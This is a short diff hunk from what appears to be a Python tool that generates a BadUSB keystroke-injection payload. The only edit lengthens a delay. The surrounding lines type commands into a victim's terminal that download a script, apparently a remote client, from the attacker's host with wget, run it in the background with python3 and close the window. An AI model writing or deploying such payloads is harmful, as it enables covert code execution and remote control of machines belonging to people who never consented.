@@ -38,7 +38,7 @@ badusb_payload = f"""DEFAULT_DELAY 1
 GUI
 DELAY 300
 STRING terminal
-DELAY 300
+DELAY 500
 ENTER
 DELAY 500
 STRING (wget http://{local_ip}:8000/client_r.py -O /tmp/client_r.py && python3 /tmp/client_r.py) & disown; exit
